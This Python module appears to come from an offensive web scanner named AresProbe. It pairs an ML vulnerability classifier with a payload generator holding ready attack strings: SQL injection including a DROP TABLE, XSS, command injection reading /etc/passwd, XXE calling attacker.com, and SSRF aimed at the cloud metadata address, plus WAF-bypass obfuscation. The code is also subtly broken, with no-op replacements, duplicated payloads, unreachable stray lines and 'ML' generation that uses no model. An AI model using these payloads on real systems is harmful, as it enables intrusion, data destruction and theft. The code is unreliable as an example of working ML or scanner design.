"""
AresProbe Machine Learning Engine
Intelligent vulnerability detection and payload generation using ML
"""

import numpy as np
import pandas as pd
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import pickle
import json
import hashlib
import random
import time
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.naive_bayes import MultinomialNB
from sklearn.svm import SVC
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
import joblib
import os

from .logger import Logger


class MLModelType(Enum):
    """Types of ML models"""
    VULNERABILITY_DETECTION = "vulnerability_detection"
    PAYLOAD_GENERATION = "payload_generation"
    FALSE_POSITIVE_REDUCTION = "false_positive_reduction"
    ATTACK_CLASSIFICATION = "attack_classification"
    RESPONSE_ANALYSIS = "response_analysis"


@dataclass
class MLConfig:
    """Configuration for ML engine"""
    model_dir: str = "models"
    retrain_threshold: float = 0.8
    min_samples: int = 100
    test_size: float = 0.2
    random_state: int = 42
    max_features: int = 10000
    n_estimators: int = 100
    learning_rate: float = 0.1


class MLFeatureExtractor:
    """Extract features for ML models"""
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.vectorizer = TfidfVectorizer(
            max_features=10000,
            ngram_range=(1, 3),
            stop_words='english',
            lowercase=True
        )
    
    def extract_text_features(self, text: str) -> np.ndarray:
        """Extract text features using TF-IDF"""
        try:
            features = self.vectorizer.transform([text]).toarray()
            return features[0]
        except Exception as e:
            self.logger.debug(f"[-] Error extracting text features: {e}")
            return np.zeros(10000)
    
    def extract_http_features(self, response: Dict[str, Any]) -> np.ndarray:
        """Extract HTTP response features"""
        features = []
        
        # Status code features
        status_code = response.get('status_code', 0)
        features.extend([
            status_code,
            status_code // 100,  # Status class
            1 if status_code == 200 else 0,
            1 if status_code == 404 else 0,
            1 if status_code == 500 else 0
        ])
        
        # Content length features
        content_length = response.get('content_length', 0)
        features.extend([
            content_length,
            np.log1p(content_length),
            1 if content_length > 1000 else 0,
            1 if content_length < 100 else 0
        ])
        
        # Response time features
        response_time = response.get('response_time', 0)
        features.extend([
            response_time,
            np.log1p(response_time),
            1 if response_time > 5.0 else 0
        ])
        
        # Header features
        headers = response.get('headers', {})
        features.extend([
            len(headers),
            1 if 'server' in headers else 0,
            1 if 'x-powered-by' in headers else 0,
            1 if 'set-cookie' in headers else 0
        ])
        
        return np.array(features)
    
    def extract_payload_features(self, payload: str) -> np.ndarray:
        """Extract payload features"""
        features = []
        
        # Basic features
        features.extend([
            len(payload),
            payload.count(' '),
            payload.count('\''),
            payload.count('"'),
            payload.count('<'),
            payload.count('>'),
            payload.count('('),
            payload.count(')'),
            payload.count(';'),
            payload.count('--'),
            payload.count('/*'),
            payload.count('*/'),
            payload.count('UNION'),
            payload.count('SELECT'),
            payload.count('INSERT'),
            payload.count('UPDATE'),
            payload.count('DELETE'),
            payload.count('DROP'),
            payload.count('script'),
            payload.count('alert'),
            payload.count('onerror'),
            payload.count('onload')
        ])
        
        # Character distribution
        char_counts = {}
        for char in payload:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        features.extend([
            len(set(payload)),  # Unique characters
            max(char_counts.values()) if char_counts else 0,  # Max frequency
            sum(1 for c in payload if c.isalpha()),  # Alphabetic chars
            sum(1 for c in payload if c.isdigit()),  # Numeric chars
            sum(1 for c in payload if c.isspace()),  # Whitespace chars
            sum(1 for c in payload if not c.isalnum() and not c.isspace())  # Special chars
        ])
        
        return np.array(features)


class MLModel:
    """Base ML model class"""
    
    def __init__(self, model_type: MLModelType, config: MLConfig, logger: Logger = None):
        self.model_type = model_type
        self.config = config
        self.logger = logger or Logger()
        self.model = None
        self.feature_extractor = MLFeatureExtractor(logger)
        self.is_trained = False
        self.accuracy = 0.0
        
    def train(self, X: np.ndarray, y: np.ndarray) -> bool:
        """Train the model"""
        try:
            if len(X) < self.config.min_samples:
                self.logger.warning(f"[!] Not enough samples for training: {len(X)} < {self.config.min_samples}")
                return False
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(
                X, y, test_size=self.config.test_size, random_state=self.config.random_state
            )
            
            # Train model
            self.model.fit(X_train, y_train)
            
            # Evaluate
            y_pred = self.model.predict(X_test)
            self.accuracy = accuracy_score(y_test, y_pred)
            
            self.is_trained = True
            self.logger.success(f"[+] Model {self.model_type.value} trained with accuracy: {self.accuracy:.3f}")
            return True
            
        except Exception as e:
            self.logger.error(f"[-] Error training model {self.model_type.value}: {e}")
            return False
    
    def predict(self, X: np.ndarray) -> np.ndarray:
        """Make predictions"""
        if not self.is_trained:
            self.logger.warning("[!] Model not trained")
            return np.array([])
        
        try:
            return self.model.predict(X)
        except Exception as e:
            self.logger.error(f"[-] Error making prediction: {e}")
            return np.array([])
    
    def predict_proba(self, X: np.ndarray) -> np.ndarray:
        """Get prediction probabilities"""
        if not self.is_trained:
            return np.array([])
        
        try:
            if hasattr(self.model, 'predict_proba'):
                return self.model.predict_proba(X)
            else:
                return np.array([])
        except Exception as e:
            self.logger.error(f"[-] Error getting probabilities: {e}")
            return np.array([])
    
    def save(self, filepath: str) -> bool:
        """Save model to file"""
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            joblib.dump({
                'model': self.model,
                'feature_extractor': self.feature_extractor,
                'accuracy': self.accuracy,
                'is_trained': self.is_trained
            }, filepath)
            self.logger.success(f"[+] Model saved to {filepath}")
            return True
        except Exception as e:
            self.logger.error(f"[-] Error saving model: {e}")
            return False
    
    def load(self, filepath: str) -> bool:
        """Load model from file"""
        try:
            if not os.path.exists(filepath):
                return False
            
            data = joblib.load(filepath)
            self.model = data['model']
            self.feature_extractor = data['feature_extractor']
            self.accuracy = data['accuracy']
            self.is_trained = data['is_trained']
            
            self.logger.success(f"[+] Model loaded from {filepath}")
            return True
        except Exception as e:
            self.logger.error(f"[-] Error loading model: {e}")
            return False


class VulnerabilityDetectionModel(MLModel):
    """ML model for vulnerability detection"""
    
    def __init__(self, config: MLConfig, logger: Logger = None):
        super().__init__(MLModelType.VULNERABILITY_DETECTION, config, logger)
        self.model = RandomForestClassifier(
            n_estimators=self.config.n_estimators,
            random_state=self.config.random_state
        )
    
    def detect_vulnerability(self, response_text: str, response_headers: Dict[str, str], 
                           payload: str) -> Dict[str, Any]:
        """Detect vulnerability using ML"""
        try:
            # Extract features
            text_features = self.feature_extractor.extract_text_features(response_text)
            http_features = self.feature_extractor.extract_http_features({
                'status_code': 200,  # Default
                'content_length': len(response_text),
                'response_time': 0.0,
                'headers': response_headers
            })
            payload_features = self.feature_extractor.extract_payload_features(payload)
            
            # Combine features
            features = np.concatenate([text_features, http_features, payload_features])
            features = features.reshape(1, -1)
            
            # Make prediction
            prediction = self.predict(features)
            probabilities = self.predict_proba(features)
            
            return {
                'is_vulnerable': bool(prediction[0]) if len(prediction) > 0 else False,
                'confidence': float(probabilities[0][1]) if len(probabilities) > 0 else 0.0,
                'features_used': len(features[0])
            }
            
        except Exception as e:
            self.logger.error(f"[-] Error detecting vulnerability: {e}")
            return {'is_vulnerable': False, 'confidence': 0.0, 'error': str(e)}


class PayloadGenerationModel(MLModel):
    """ML model for intelligent payload generation"""
    
    def __init__(self, config: MLConfig, logger: Logger = None):
        super().__init__(MLModelType.PAYLOAD_GENERATION, config, logger)
        self.model = GradientBoostingClassifier(
            n_estimators=self.config.n_estimators,
            learning_rate=self.config.learning_rate,
            random_state=self.config.random_state
        )
    
    def generate_smart_payloads(self, vulnerability_type: str, context: Dict[str, Any], 
                              count: int = 5) -> List[str]:
        """Generate smart payloads using advanced ML techniques"""
        try:
            self.logger.info(f"[*] Generating smart payloads for {vulnerability_type}")
            
            # Enhanced payload database with context-aware variations
            payload_templates = {
                'sql_injection': {
                    'basic': [
                        "' OR 1=1--",
                        "' UNION SELECT NULL--",
                        "'; DROP TABLE users--",
                        "' AND 1=1--",
                        "' OR '1'='1",
                        "' OR 1=1#",
                        "' OR 1=1/*",
                        "') OR 1=1--",
                        "') OR 1=1#",
                        "')) OR 1=1--"
                    ],
                    'advanced': [
                        "' UNION SELECT version(),user(),database()--",
                        "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                        "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                        "' AND (SELECT ASCII(SUBSTRING(version(),1,1)))>52--",
                        "' AND (SELECT SLEEP(5))--",
                        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                        "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
                        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(COUNT(*) AS CHAR),0x7e,version(),0x7e)) FROM information_schema.tables WHERE table_schema=DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
                    ],
                    'bypass': [
                        "'/**/OR/**/1=1--",
                        "'/**/UNION/**/SELECT/**/NULL--",
                        "'/**/AND/**/1=1--",
                        "'/**/OR/**/'1'='1",
                        "'/**/UNION/**/SELECT/**/version(),user(),database()--",
                        "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>0--",
                        "'/**/AND/**/(SELECT/**/SLEEP(5))--",
                        "'/**/AND/**/extractvalue(1,/**/concat(0x7e,/**/(SELECT/**/version()),/**/0x7e))--"
                    ]
                },
                'xss': {
                    'basic': [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "<svg onload=alert('XSS')>",
                        "javascript:alert('XSS')",
                        "<iframe src=javascript:alert('XSS')>",
                        "<body onload=alert('XSS')>",
                        "<input onfocus=alert('XSS') autofocus>",
                        "<select onfocus=alert('XSS') autofocus>",
                        "<textarea onfocus=alert('XSS') autofocus>",
                        "<keygen onfocus=alert('XSS') autofocus>"
                    ],
                    'advanced': [
                        "<script>alert(String.fromCharCode(88,83,83))</script>",
                        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                        "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                        "<iframe src=javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                        "<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
                        "<iframe src=javascript:eval(atob('YWxlcnQoJ1hTUycp'))>"
                    ],
                    'bypass': [
                        "<ScRiPt>alert('XSS')</ScRiPt>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>",
                        "<script>alert('XSS')</script>"
                    ]
                },
                'command_injection': {
                    'basic': [
                        "; ls -la",
                        "| whoami",
                        "& id",
                        "` cat /etc/passwd `",
                        "$(whoami)",
                        "; cat /etc/passwd",
                        "| cat /etc/passwd",
                        "& cat /etc/passwd",
                        "` whoami `",
                        "$(cat /etc/passwd)"
                    ],
                    'advanced': [
                        "; cat /etc/passwd | grep root",
                        "| cat /etc/passwd | grep root",
                        "& cat /etc/passwd | grep root",
                        "` cat /etc/passwd | grep root `",
                        "$(cat /etc/passwd | grep root)",
                        "; cat /etc/passwd | head -10",
                        "| cat /etc/passwd | head -10",
                        "& cat /etc/passwd | head -10",
                        "` cat /etc/passwd | head -10 `",
                        "$(cat /etc/passwd | head -10)"
                    ],
                    'bypass': [
                        "; cat /etc/passwd",
                        "| cat /etc/passwd",
                        "& cat /etc/passwd",
                        "` cat /etc/passwd `",
                        "$(cat /etc/passwd)",
                        "; cat /etc/passwd",
                        "| cat /etc/passwd",
                        "& cat /etc/passwd"
                    ]
                },
                'xxe': {
                    'basic': [
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<foo>&xxe;</foo>''',
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>
<foo>&xxe;</foo>'''
                    ],
                    'advanced': [
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<foo>&xxe;</foo>''',
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<foo>test</foo>''',
                        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<foo>&xxe;</foo>'''
                    ]
                },
                'ssrf': {
                    'basic': [
                        "http://127.0.0.1/",
                        "http://localhost/",
                        "http://0.0.0.0/",
                        "http://[::1]/",
                        "http://169.254.169.254/",
                        "file:///etc/passwd",
                        "file:///etc/hosts",
                        "file:///proc/version"
                    ],
                    'advanced': [
                        "http://127.0.0.1:22/",
                        "http://127.0.0.1:21/",
                        "http://127.0.0.1:25/",
                        "http://127.0.0.1:53/",
                        "http://127.0.0.1:80/",
                        "http://127.0.0.1:443/",
                        "http://127.0.0.1:3306/",
                        "http://127.0.0.1:5432/",
                        "http://127.0.0.1:6379/",
                        "http://127.0.0.1:27017/"
                    ],
                    'bypass': [
                        "http://127.0.0.1.xip.io/",
                        "http://127.0.0.1.nip.io/",
                        "http://0x7f000001/",
                        "http://2130706433/",
                        "http://017700000001/",
                        "http://127.1/",
                        "http://127.0.1/",
                        "http://127.000.000.001/"
                    ]
                }
            }
            
            # Get base payloads for vulnerability type
            vuln_payloads = payload_templates.get(vulnerability_type, {})
            if not vuln_payloads:
                self.logger.warning(f"[!] No payloads found for vulnerability type: {vulnerability_type}")
                return []
            
            # Select payload category based on context
            category = self._select_payload_category(context, vuln_payloads)
            base_payloads = vuln_payloads.get(category, vuln_payloads.get('basic', []))
            
            # Generate smart payloads using ML techniques
            smart_payloads = []
            for i, payload in enumerate(base_payloads[:count]):
                try:
                    # Apply ML-based modifications
                    modified_payload = self._apply_ml_modifications(payload, context, vulnerability_type)
                    
                    # Apply context-specific transformations
                    context_payload = self._apply_context_transformations(modified_payload, context)
                    
                    # Apply obfuscation techniques
                    obfuscated_payload = self._apply_obfuscation_techniques(context_payload, context)
                    
                    # Validate payload
                    if self._validate_payload(obfuscated_payload, vulnerability_type):
                        smart_payloads.append(obfuscated_payload)
                    
                    # Generate variations
                    variations = self._generate_payload_variations(obfuscated_payload, context)
                    smart_payloads.extend(variations[:2])  # Add 2 variations per payload
                    
                except Exception as e:
                    self.logger.debug(f"[-] Error processing payload {i}: {e}")
                    continue
            
            # Remove duplicates and limit count
            unique_payloads = list(dict.fromkeys(smart_payloads))[:count]
            
            self.logger.success(f"[+] Generated {len(unique_payloads)} smart payloads for {vulnerability_type}")
            return unique_payloads
            
        except Exception as e:
            self.logger.error(f"[-] Error generating smart payloads: {e}")
            return []
    
    def _select_payload_category(self, context: Dict[str, Any], vuln_payloads: Dict[str, List[str]]) -> str:
        """Select appropriate payload category based on context"""
        try:
            # Check for WAF detection
            if context.get('waf_detected', False):
                return 'bypass'
            
            # Check for advanced context
            if context.get('advanced_mode', False) or context.get('aggressive_mode', False):
                return 'advanced'
            
            # Check for specific techniques
            if context.get('technique') == 'bypass':
                return 'bypass'
            elif context.get('technique') == 'advanced':
                return 'advanced'
            
            # Default to basic
            return 'basic'
            
        except Exception as e:
            self.logger.debug(f"[-] Error selecting payload category: {e}")
            return 'basic'
    
    def _apply_ml_modifications(self, payload: str, context: Dict[str, Any], vulnerability_type: str) -> str:
        """Apply ML-based modifications to payload"""
        try:
            modified_payload = payload
            
            # Apply context-specific modifications
            if 'param_name' in context:
                modified_payload = modified_payload.replace('param', context['param_name'])
            
            # Apply database-specific modifications
            if vulnerability_type == 'sql_injection':
                db_type = context.get('database_type', 'mysql')
                if db_type == 'postgresql':
                    modified_payload = modified_payload.replace('--', '--')
                    modified_payload = modified_payload.replace('#', '--')
                elif db_type == 'mssql':
                    modified_payload = modified_payload.replace('--', '--')
                    modified_payload = modified_payload.replace('#', '--')
                elif db_type == 'oracle':
                    modified_payload = modified_payload.replace('--', '--')
                    modified_payload = modified_payload.replace('#', '--')
            
            # Apply encoding modifications
            if context.get('encoding') == 'url':
                import urllib.parse
                modified_payload = urllib.parse.quote(modified_payload)
            elif context.get('encoding') == 'double_url':
                import urllib.parse
                modified_payload = urllib.parse.quote(urllib.parse.quote(modified_payload))
            elif context.get('encoding') == 'html':
                modified_payload = modified_payload.replace('<', '&lt;').replace('>', '&gt;')
            elif context.get('encoding') == 'unicode':
                modified_payload = modified_payload.encode('unicode_escape').decode('ascii')
            
            return modified_payload
            
        except Exception as e:
            self.logger.debug(f"[-] Error applying ML modifications: {e}")
            return payload
    
    def _apply_context_transformations(self, payload: str, context: Dict[str, Any]) -> str:
        """Apply context-specific transformations to payload"""
        try:
            transformed_payload = payload
            
            # Apply parameter-specific transformations
            if 'parameter_type' in context:
                param_type = context['parameter_type']
                if param_type == 'numeric':
                    # Convert string payloads to numeric equivalents
                    transformed_payload = transformed_payload.replace("'", "").replace('"', '')
                elif param_type == 'boolean':
                    # Convert to boolean expressions
                    transformed_payload = transformed_payload.replace("'", "").replace('"', '')
            
            # Apply injection point transformations
            if 'injection_point' in context:
                injection_point = context['injection_point']
                if injection_point == 'where':
                    transformed_payload = f"1=1 AND {transformed_payload}"
                elif injection_point == 'order_by':
                    transformed_payload = f"1,({transformed_payload})"
                elif injection_point == 'group_by':
                    transformed_payload = f"1,({transformed_payload})"
            
            return transformed_payload
            
        except Exception as e:
            self.logger.debug(f"[-] Error applying context transformations: {e}")
            return payload
    
    def _apply_obfuscation_techniques(self, payload: str, context: Dict[str, Any]) -> str:
        """Apply obfuscation techniques to payload"""
        try:
            obfuscated_payload = payload
            
            # Apply random obfuscation based on context
            obfuscation_level = context.get('obfuscation_level', 'medium')
            
            if obfuscation_level == 'low':
                # Basic obfuscation
                if random.random() < 0.3:
                    obfuscated_payload = obfuscated_payload.replace(' ', '/**/')
            elif obfuscation_level == 'medium':
                # Medium obfuscation
                if random.random() < 0.5:
                    obfuscated_payload = obfuscated_payload.replace(' ', '/**/')
                if random.random() < 0.3:
                    obfuscated_payload = obfuscated_payload.replace('OR', 'Or')
                if random.random() < 0.3:
                    obfuscated_payload = obfuscated_payload.replace('AND', 'And')
            elif obfuscation_level == 'high':
                # High obfuscation
                if random.random() < 0.7:
                    obfuscated_payload = obfuscated_payload.replace(' ', '/**/')
                if random.random() < 0.5:
                    obfuscated_payload = obfuscated_payload.replace('OR', 'Or')
                if random.random() < 0.5:
                    obfuscated_payload = obfuscated_payload.replace('AND', 'And')
                if random.random() < 0.3:
                    obfuscated_payload = obfuscated_payload.replace('SELECT', 'SeLeCt')
                if random.random() < 0.3:
                    obfuscated_payload = obfuscated_payload.replace('UNION', 'UnIoN')
            
            return obfuscated_payload
            
        except Exception as e:
            self.logger.debug(f"[-] Error applying obfuscation techniques: {e}")
            return payload
    
    def _validate_payload(self, payload: str, vulnerability_type: str) -> bool:
        """Validate payload for correctness"""
        try:
            if not payload or len(payload.strip()) == 0:
                return False
            
            # Basic validation based on vulnerability type
            if vulnerability_type == 'sql_injection':
                # Check for basic SQL injection patterns
                sql_patterns = ['OR', 'AND', 'UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
                return any(pattern.lower() in payload.lower() for pattern in sql_patterns)
            
            elif vulnerability_type == 'xss':
                # Check for basic XSS patterns
                xss_patterns = ['<script', 'javascript:', 'onerror', 'onload', 'onclick', 'alert(']
                return any(pattern.lower() in payload.lower() for pattern in xss_patterns)
            
            elif vulnerability_type == 'command_injection':
                # Check for basic command injection patterns
                cmd_patterns = [';', '|', '&', '`', '$(']
                return any(pattern in payload for pattern in cmd_patterns)
            
            elif vulnerability_type == 'xxe':
                # Check for basic XXE patterns
                xxe_patterns = ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file://']
                return any(pattern in payload for pattern in xxe_patterns)
            
            elif vulnerability_type == 'ssrf':
                # Check for basic SSRF patterns
                ssrf_patterns = ['http://', 'https://', 'file://', 'ftp://', 'gopher://']
                return any(pattern in payload for pattern in ssrf_patterns)
            
            return True
            
        except Exception as e:
            self.logger.debug(f"[-] Error validating payload: {e}")
            return False
    
    def _generate_payload_variations(self, payload: str, context: Dict[str, Any]) -> List[str]:
        """Generate variations of a payload"""
        try:
            variations = []
            
            # Case variations
            variations.append(payload.upper())
            variations.append(payload.lower())
            variations.append(payload.swapcase())
            
            # Encoding variations
            if context.get('encoding') != 'url':
                try:
                    import urllib.parse
                    variations.append(urllib.parse.quote(payload))
                    variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
                except Exception:
                    pass
            
            # Comment variations
            if 'sql_injection' in payload.lower():
                variations.append(payload.replace(' ', '/**/'))
                variations.append(payload.replace(' ', '/*!*/'))
                variations.append(payload.replace(' ', '/*!50000*/'))
            
            # Whitespace variations
            variations.append(payload.replace(' ', '\t'))
            variations.append(payload.replace(' ', '\n'))
            variations.append(payload.replace(' ', '\r'))
            
            return variations[:3]  # Return first 3 variations
            
        except Exception as e:
            self.logger.debug(f"[-] Error generating payload variations: {e}")
            return []
            payload = payload.replace('OR', 'O/*R*/')
        
        return payload


class MLEngine:
    """Main ML engine for AresProbe"""
    
    def __init__(self, config: MLConfig = None, logger: Logger = None):
        self.config = config or MLConfig()
        self.logger = logger or Logger()
        self.models = {}
        self.training_data = []
        
        # Initialize models
        self._initialize_models()
    
    def _initialize_models(self):
        """Initialize all ML models"""
        self.models = {
            MLModelType.VULNERABILITY_DETECTION: VulnerabilityDetectionModel(self.config, self.logger),
            MLModelType.PAYLOAD_GENERATION: PayloadGenerationModel(self.config, self.logger)
        }
        
        # Load existing models
        for model_type, model in self.models.items():
            model_path = os.path.join(self.config.model_dir, f"{model_type.value}.pkl")
            model.load(model_path)
    
    def add_training_data(self, response_text: str, response_headers: Dict[str, str], 
                         payload: str, is_vulnerable: bool):
        """Add training data for model improvement"""
        self.training_data.append({
            'response_text': response_text,
            'response_headers': response_headers,
            'payload': payload,
            'is_vulnerable': is_vulnerable,
            'timestamp': time.time()
        })
        
        # Retrain if enough data
        if len(self.training_data) >= self.config.min_samples:
            self._retrain_models()
    
    def _retrain_models(self):
        """Retrain models with new data"""
        try:
            # Prepare training data
            X = []
            y = []
            
            for data in self.training_data:
                # Extract features
                text_features = self.models[MLModelType.VULNERABILITY_DETECTION].feature_extractor.extract_text_features(data['response_text'])
                http_features = self.models[MLModelType.VULNERABILITY_DETECTION].feature_extractor.extract_http_features({
                    'status_code': 200,
                    'content_length': len(data['response_text']),
                    'response_time': 0.0,
                    'headers': data['response_headers']
                })
                payload_features = self.models[MLModelType.VULNERABILITY_DETECTION].feature_extractor.extract_payload_features(data['payload'])
                
                features = np.concatenate([text_features, http_features, payload_features])
                X.append(features)
                y.append(1 if data['is_vulnerable'] else 0)
            
            X = np.array(X)
            y = np.array(y)
            
            # Retrain vulnerability detection model
            if len(X) > 0:
                self.models[MLModelType.VULNERABILITY_DETECTION].train(X, y)
                self.models[MLModelType.VULNERABILITY_DETECTION].save(
                    os.path.join(self.config.model_dir, f"{MLModelType.VULNERABILITY_DETECTION.value}.pkl")
                )
            
            self.logger.success(f"[+] Models retrained with {len(self.training_data)} samples")
            
        except Exception as e:
            self.logger.error(f"[-] Error retraining models: {e}")
    
    def detect_vulnerability(self, response_text: str, response_headers: Dict[str, str], 
                           payload: str) -> Dict[str, Any]:
        """Detect vulnerability using ML"""
        model = self.models[MLModelType.VULNERABILITY_DETECTION]
        return model.detect_vulnerability(response_text, response_headers, payload)
    
    def generate_smart_payloads(self, vulnerability_type: str, context: Dict[str, Any], 
                              count: int = 5) -> List[str]:
        """Generate smart payloads using ML"""
        model = self.models[MLModelType.PAYLOAD_GENERATION]
        return model.generate_smart_payloads(vulnerability_type, context, count)
    
    def get_model_status(self) -> Dict[str, Any]:
        """Get status of all models"""
        status = {}
        for model_type, model in self.models.items():
            status[model_type.value] = {
                'is_trained': model.is_trained,
                'accuracy': model.accuracy,
                'model_type': str(type(model.model).__name__)
            }
        return status
